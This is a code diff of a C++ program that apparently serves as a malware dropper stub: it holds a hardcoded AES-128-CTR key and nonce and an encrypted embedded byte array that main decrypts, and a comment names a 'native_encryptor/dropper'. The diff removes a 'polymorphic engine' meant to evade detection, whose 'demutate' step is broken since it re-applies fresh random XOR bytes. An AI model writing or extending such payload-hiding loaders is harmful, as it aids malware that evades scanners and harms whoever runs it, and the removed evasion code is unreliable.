@@ -13,34 +13,7 @@
 const std::string keyHex = "3939080f0f3808313832383939080f0f";
 const std::string nonceHex = "51b6b7248d425390898eafbc459acba8";
 
-// Polymorphic code mutation
-class PolymorphicEngine {
-private:
-    std::mt19937 rng;
-    std::uniform_int_distribution<int> dist;
-    
-public:
-    PolymorphicEngine() : rng(std::time(nullptr)), dist(0, 255) {}
-    
-    uint8_t mutateByte(uint8_t input) {
-        // Simple polymorphic transformation
-        uint8_t mutation = dist(rng);
-        return input ^ mutation;
-    }
-    
-    void mutateArray(uint8_t* data, size_t size) {
-        for (size_t i = 0; i < size; i++) {
-            data[i] = mutateByte(data[i]);
-        }
-    }
-    
-    void demutateArray(uint8_t* data, size_t size) {
-        // Reverse the mutation
-        for (size_t i = 0; i < size; i++) {
-            data[i] = mutateByte(data[i]);
-        }
-    }
-};
+
 
 // AES-128-CTR implementation (same as native_encryptor/dropper)
 static const uint8_t sbox[256] = {
@@ -233,9 +206,6 @@ void hexToBytes(const std::string& hex, uint8_t* bytes) {
 }
 
 int main() {
-    // Initialize polymorphic engine
-    PolymorphicEngine polyEngine;
-    
     // Embedded encrypted data
     uint8_t encryptedData[] = {0xa9, 0xe5, 0x0e, 0x8c, 0x90, 0xfc, 0x62, 0x15, 0x8c, 0xb0, 0x70, 0xaa, 0x88, 0x54, 0x6e, 0xd5, 0xac, 0x0e, 0x50, 0x0c, 0xed, 0xa6, 0x23, 0xc3, 0x54, 0x47, 0x17, 0xf5, 0xdb, 0xc0, 0x3f, 0xfe, 0xf2, 0x07, 0x11, 0x58, 0x89, 0xfb, 0x43, 0x53, 0x4b, 0xb1, 0x11, 0x42, 0xdb, 0xd2, 0x11, 0x2d, 0x9f, 0x30, 0xbe, 0x67, 0xc0, 0x36, 0x43, 0xb3, 0x07, 0xab, 0x29, 0x39, 0x96, 0xc5, 0x3b, 0xf6, 0xe6, 0x18, 0xd6, 0x51, 0x02, 0xad, 0x4e, 0x63, 0x89, 0x22, 0x60, 0xf3, 0xaa, 0xf6, 0x97, 0xb0, 0xc1, 0x2c, 0xa4, 0x8b, 0x7d, 0x81, 0x8e, 0x5b, 0xe4, 0x38, 0xa8, 0x94, 0x31, 0x16, 0x8d, 0x11, 0xd7, 0x87, 0xab, 0x13, 0x2e, 0x80, 0xd4, 0x52, 0xc3, 0x1d, 0x0e, 0xed, 0x83, 0x4a, 0xbe, 0x2c, 0xaa, 0x50, 0x6a, 0x3c, 0x0c, 0x25, 0x4b, 0xae, 0x08, 0x5e, 0xdc, 0x7a, 0xc2};
     size_t dataSize = sizeof(encryptedData);
@@ -244,14 +214,6 @@ int main() {
     uint8_t key[16], nonce[16];
     hexToBytes(keyHex, key);
     hexToBytes(nonceHex, nonce);
-    
-    // Apply polymorphic mutation to key and nonce
-    polyEngine.mutateArray(key, 16);
-    polyEngine.mutateArray(nonce, 16);
-    
-    // Demutate before use
-    polyEngine.demutateArray(key, 16);
-    polyEngine.demutateArray(nonce, 16);
     
     // Decrypt the data using AES-128-CTR
     aesCtrCrypt(encryptedData, encryptedData, dataSize, key, nonce);
